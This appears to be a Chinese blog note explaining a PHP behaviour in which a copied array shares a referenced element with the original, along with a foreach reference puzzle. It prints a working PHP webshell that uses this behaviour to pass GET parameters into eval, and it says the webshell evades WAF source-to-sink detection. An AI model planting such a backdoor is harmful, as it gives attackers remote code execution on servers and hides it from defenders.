
## PHP "BUG" 特性

[PHP 在线工具 - 菜鸟工具](https://c.runoob.com/compile/1/)

[![XNtAC6.png](https://s1.ax1x.com/2022/06/03/XNtAC6.png)](https://imgtu.com/i/XNtAC6)

上面运行结果可以看出c这个字符内存地址相同的问题。

为什么\$c=\$a后，\$c[0]会改变\$a[0]呢。七友大佬给出了官方的解释：

如果对数组的单个元素进行引用，然后复制数组，无论是通过赋值还是通 过函数调用中的值传递，都会将引用复制为数组的一部分。这意味着对任一数组中任何此类元素的更改 都将在另一个数组（和其他引用中）中重复

## 条件

即，满足这个BUG特性需要两个条件

1.原数组的一个元素被引用了，即&$a[0]

2.原数组被复制了，即$b=$a

那么此时，我们就可以通过复制过去的数组，去修改原数组那一个元素，因为两个数组中这两个元素指向同一个地址。

 - [ ] 再看大佬给出的Webshell，猜猜是怎么执行的。
       
       <?php
       
       $a = array(1 => "A");
       
       $b=&$a[1];
       
       $c=$a;
       
       $c[$_GET["mem"]]=$_GET["cmd"];
       
       eval($a[1]);
       
       ?>

首先\$b是工具人，用于触发元素引用的条件。之后\$c复制了数组\$a，数组\$c修改了\$_GET["mem"]这个索引对应的参数为\$_GET["cmd"]。最后命令执行数组$a[1]索引参数。

[![XNtAC6.png](https://s1.ax1x.com/2022/06/03/XNtAC6.png)](https://imgtu.com/i/XNtAC6)

显然没传参时看不出什么结果。但是结合利用图就能明白了。数组$c还没有接收参数，因此它现在还不具备修改\$a元素的第二个条件。等到用户传参men为1时才满足，此时数组$a[1]的值为用户传参cmd，eval命令执行。正因为该行为不容易被source到sink规则检测出来，适合用于过Waf。

[![XNtAC6.png](https://s1.ax1x.com/2022/06/03/XNtAC6.png)](https://imgtu.com/i/XNtAC6)

大佬最后留了一个问题，以下内容输出结果的思考。

[![XNtnDH.png](https://s1.ax1x.com/2022/06/03/XNtnDH.png)](https://imgtu.com/i/XNtnDH)

为什么第二次输出\$array[2]改变了？不妨思考foreach执行到最后一句，是\$array[2]=&\$item，这时&\$item的地址不再改变，即$item=&array[2]。

> array(3) {
> 
> [0]=>
> 
> int(1)
> 
> [1]=>
> 
> int(2)
> 
> [2]=>
> 
> &int(3)
> 
> }

再执行一次foreach，依次执行了\$item=\$array[0]，具备修改条件，此时array[2]为1；\$item=\$array[1]，具备修改条件，此时array[2]为2；\$item[2]=\$array[2]，具备修改条件，此时赋值完还是2。

更多解释可以看这篇英文原文：https://bugs.php.net/bug.php?id=29992
